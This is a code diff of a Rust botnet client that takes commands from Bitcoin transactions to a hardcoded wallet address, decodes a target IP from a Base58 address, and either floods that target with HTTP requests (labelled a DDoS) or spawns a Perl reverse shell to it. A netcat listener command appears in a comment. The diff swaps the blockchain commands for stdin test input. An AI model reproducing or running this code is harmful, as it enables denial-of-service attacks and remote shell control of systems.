@@ -2,6 +2,7 @@ extern crate curl;
 extern crate serialize;
 
 use std::str;
+use std::io;
 use std::io::Timer;
 use std::time::Duration;
 use std::io::Command;
@@ -26,13 +27,15 @@ pub struct Transaction {
 #[deriving(Decodable, Encodable)]
 pub struct OutTransaction {
 	addr: String,
-	value: u32
+	value: int
 }
 
 
 fn main() {
-	let mut wallet_addr = "14L55Bu9f4LsCS7ddK8FfftACYvGjyWWcC";
-	// let test_target_addr: [u8, ..4] = [192, 168, 153, 128];
+	let mut wallet_addr = String::from_str("14L55Bu9f4LsCS7ddK8FfftACYvGjyWWcC");
+
+	// Input reader for testing
+	let mut reader = io::stdin();
 
 	// Create a timer to space out the requests
 	let mut timer = Timer::new().unwrap();
@@ -40,32 +43,42 @@ fn main() {
 
 	// Runloop
 	loop {
-		let resp = http::handle().get(format!("https://blockchain.info/address/{}?sort=0&filter=1&format=json", wallet_addr)).exec().unwrap();
+		let resp = http::handle().get(format!("https://blockchain.info/address/{}?sort=0&filter=1&format=json", wallet_addr.as_slice())).exec().unwrap();
 		let json_resp = match str::from_utf8(resp.get_body()) {
 			Some(e) => e,
 			None => panic!("Invalid UTF-8 sequence"),
 		};
 		let decoded_resp: Response = json::decode(json_resp).unwrap();
-
-		let addr = decoded_resp.txs[0].out[0].addr;
-		let value = decoded_resp.txs[0].out[0].value;
 		
 		// println!("{}", decoded_resp.txs[0].out[0].addr);
 		// println!("{}", decoded_resp.txs[0].out[0].value);
 
-		let decoded_addr = FromBase58::from_base58("111Cr7tp3q2521RB5rnqFAkB2cmBfa9G").unwrap();
 
-		// println!("{}", decoded_addr);
+		// Test code
+		println!("Target Address:");
+		let test_addr_str = reader.read_line().ok().expect("Failed to read address");
+		println!("Target Value:");
+		let test_val_str  = reader.read_line().ok().expect("Failed to read value");
+
+		let test_addr = test_addr_str.as_slice().trim();
+		let test_val: Option<int> = from_str(test_val_str.as_slice().trim());
+		println!("{}", test_val);
+
+
+		let decoded_addr = FromBase58::from_base58(test_addr).unwrap();
+
+		println!("{}", decoded_addr);
 
 		// DDOS the target by making 100 GET requests. The loop then continues to check if instructions have changed.
-		if value == 1 {
+		if test_val == Some(1) {
 			for i in range(0u8, 100) {
-				http::handle().get(format!("{}.{}.{}.{}", decoded_addr[3], decoded_addr[4], decoded_addr[5], decoded_addr[6]);
+				http::handle().get(format!("{}.{}.{}.{}", decoded_addr[3], decoded_addr[4], decoded_addr[5], decoded_addr[6])).exec();
 			}
 		}
 			
 		// Throw a reverse shell to the target
-		if value == 2 {
+		// Run "nc -v -n -l -p 1234" on the target to catch the shell
+		if test_val == Some(2) {
 			let script = format!("use Socket;$i=\"{}.{}.{}.{}\";$p=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};", decoded_addr[3], decoded_addr[4], decoded_addr[5], decoded_addr[6]);
 			let mut process = match Command::new("perl").arg("-e").arg(script).spawn() {
 				Ok(p) => p,
@@ -74,13 +87,14 @@ fn main() {
 		}
 
 		// Toggle blockchain provider
-		if value == 3 {
+		if test_val == Some(3) {
 
 		}
 
 		// Change address
-		if value == 4 {
-			wallet_addr = addr;
+		if test_val == Some(4) {
+			// We have to clone the string because it is destroyed at the end of the loop
+			wallet_addr = decoded_resp.txs[0].out[0].addr.clone();
 		}
 
 		periodic.recv();
